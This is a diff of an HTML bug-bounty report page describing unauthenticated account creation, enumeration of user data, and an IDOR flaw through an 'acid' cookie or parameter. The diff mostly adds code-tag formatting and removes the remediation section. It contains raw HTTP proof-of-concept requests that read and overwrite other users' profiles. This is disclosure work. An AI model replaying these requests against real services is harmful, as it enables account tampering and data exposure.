@@ -9,7 +9,7 @@
 <body>
   <div class="container">
     <header>
-      <h1>Insecure Account Creation and IDOR via acid parameter</h1>
+      <h1>Insecure Account Creation and IDOR via <code>acid</code> parameter</h1>
       <div class="meta">
         <p>BOUNTY-DEX Vulnerability Report</p>
         <p>Type: <strong>Unauthenticated account creation / IDOR / Sensitive enumeration</strong></p>
@@ -20,7 +20,7 @@
 
     <h2>Summary</h2>
     <p>
-      The application exposes an unauthenticated endpoint that allows creating new user accounts without any authentication or rate-limiting. The same API accepts an "acid" value which can be used to retrieve or update other users' profiles, leading to Insecure Direct Object Reference (IDOR).
+      The application exposes an unauthenticated endpoint that allows creating new user accounts without any authentication or rate-limiting. The same API accepts an <code>acid</code> value which can be used to retrieve or update other users' profiles, leading to Insecure Direct Object Reference (IDOR).
     </p>
 
     <h2>Endpoints & Parameters</h2>
@@ -29,7 +29,7 @@
     </p>
     <ul>
       <li>POST /api/user/create — create a user (unauthenticated)</li>
-      <li>POST /api/user/update/{id} — update a user by id (requires cookie `acid` to match target account)</li>
+      <li>POST /api/user/update/{id} — update a user by id (requires cookie <code>acid</code> to match target account)</li>
     </ul>
 
     <h2>Proof of Concept</h2>
@@ -47,7 +47,7 @@ Host: [REDACTED]<br>
 Content-Type: application/json;charset=UTF-8<br>
 <br>
 {<br>
-  "acid":"aaaaa"<br>
+  "<code>acid</code>":"aaaaa"<br>
 }
       </code>
     </div>
@@ -63,7 +63,7 @@ HTTP/1.1 200 OK<br>
       "email":null,<br>
       "walletAddress":null,<br>
       "country":null,<br>
-      "acid":"aaaaa"<br>
+      "<code>acid</code>":"aaaaa"<br>
     }<br>
   }<br>
 }
@@ -81,7 +81,7 @@ Host: [REDACTED]<br>
 Content-Type: application/json;charset=UTF-8<br>
 <br>
 {<br>
-  "acid":"hacked",<br>
+  "<code>acid</code>":"hacked",<br>
   "email":"hacked@redacted.com",<br>
   "username":"hacked",<br>
   "walletAddress":"hacked"<br>
@@ -89,12 +89,12 @@ Content-Type: application/json;charset=UTF-8<br>
       </code>
     </div>
 
-    <h3>3) Enumeration by acid</h3>
+    <h3>3) Enumeration by <code>acid</code></h3>
     <p>
-      By knowing an `acid` value (it is stored in a cookie in the application), an attacker can send a request with that `acid` to the create endpoint or to a retrieval endpoint and see data associated with that `acid`.
+      By knowing an <code>acid</code> value (it is stored in a cookie in the application), an attacker can send a request with that <code>acid</code> to the create endpoint or to a retrieval endpoint and see data associated with that <code>acid</code>.
     </p>
 
-    <p>Request with known `acid`:</p>
+    <p>Request with known <code>acid</code>:</p>
     <div class="code-block">
       <code>
 POST /api/user/create HTTP/1.1<br>
@@ -102,12 +102,12 @@ Host: [REDACTED]<br>
 Content-Type: application/json;charset=UTF-8<br>
 <br>
 {<br>
-  "acid":"account1"<br>
+  "<code>acid</code>":"account1"<br>
 }
       </code>
 </div>
 
-    <p>Response shows data associated with `acid` "account1":</p>
+    <p>Response shows data associated with <code>acid</code> "account1":</p>
 
 <div class="code-block">
       
@@ -122,16 +122,16 @@ HTTP/1.1 200 OK<br>
       "email":"account1@redacted.com",<br>
       "walletAddress":"account1",<br>
       "country":null,<br>
-      "acid":"account1"<br>
+      "<code>acid</code>":"account1"<br>
     }<br>
   }<br>
 }
       </code>
     </div>
 
-    <h3>4) IDOR — update another user's profile using `acid`</h3>
+    <h3>4) IDOR — update another user's profile using <code>acid</code></h3>
     <p>
-      After creating or enumerating a target's `acid` value and obtaining the target user's numeric id from a response, an attacker can update that user's profile by calling the update endpoint and sending the target's `acid` value in the Cookie header and the user id in the path.
+      After creating or enumerating a target's <code>acid</code> value and obtaining the target user's numeric id from a response, an attacker can update that user's profile by calling the update endpoint and sending the target's <code>acid</code> value in the Cookie header and the user id in the path.
     </p>
 
     <p>Request:</p>
@@ -140,7 +140,7 @@ HTTP/1.1 200 OK<br>
       <code>
 POST /api/user/update/2370 HTTP/1.1<br>
 Host: [REDACTED]<br>
-Cookie: acid=1234<br>
+Cookie: <code>acid</code>=1234<br>
 Content-Type: application/json;charset=UTF-8<br>
 <br>
 {<br>
@@ -161,7 +161,7 @@ Content-Type: application/json;charset=UTF-8<br>
       "username":"hacked by researcher",<br>
       "email":"attacker@redacted.com",<br>
       "walletAddress":"0x1234567282",<br>
-      "acid":"1234"<br>
+      "<code>acid</code>":"1234"<br>
     }<br>
   }<br>
 }
@@ -172,20 +172,10 @@ Content-Type: application/json;charset=UTF-8<br>
     <div class="impact-box">
       <ul>
         <li>Unlimited account creation: resource exhaustion, database pollution or spam accounts.</li>
-        <li>IDOR via `acid`: allows unauthorized modification of other users' profiles when attacker supplies the target `acid` and id.</li>
+        <li>IDOR via <code>acid</code>: allows unauthorized modification of other users' profiles when attacker supplies the target <code>acid</code> and id.</li>
         <li>Sensitive fields enumeration: attackers can enumerate emails, usernames, and other attributes.</li>
       </ul>
     </div>
-
-    <h2>Recommendations</h2>
-    <ol>
-      <li>Require authentication and authorization for account creation and profile modification endpoints.</li>
-      <li>Do not use predictable or client-controlled identifiers for access control — associate server-side session tokens with accounts and validate on every request.</li>
-      <li>Make sensitive fields unique server-side and avoid leaking existence information in error messages.</li>
-      <li>Add rate-limiting and anti-automation controls on account creation endpoints.</li>
-      <li>Set security flags on cookies (HttpOnly, Secure, SameSite) and avoid exposing internal identifiers in client-side contexts.</li>
-    </ol>
-
     <a href="../" class="back-link">← Back to BOUNTY-DEX</a>
   </div>
 </body>
